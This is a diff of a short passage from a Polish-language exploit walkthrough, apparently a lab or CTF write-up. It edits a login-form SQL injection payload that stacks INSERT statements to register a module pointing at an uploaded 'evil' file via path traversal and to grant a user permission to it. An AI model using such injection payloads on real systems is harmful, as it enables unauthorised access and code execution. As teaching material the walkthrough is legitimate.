@@ -5,7 +5,7 @@
 Nie rozwodząc się za bardzo nad działaniem tego zapytania, w formularzu logowania należy wprowadzić:
 
 ```
-Login: ' OR 1=1; INSERT INTO modules(path, name) VALUES ('../../uploads/evil.pdf.php', 'Evil'); INSERT INTO permissions(module_id, user_id) VALUES (2, 1); --
+Login: ' OR 1=1; INSERT INTO modules(path, name) VALUES ('../../uploads/evil.pdf', 'Evil'); INSERT INTO permissions(module_id, user_id) VALUES (2, 1); --
 
 Hasło: <dowolne>
 ```
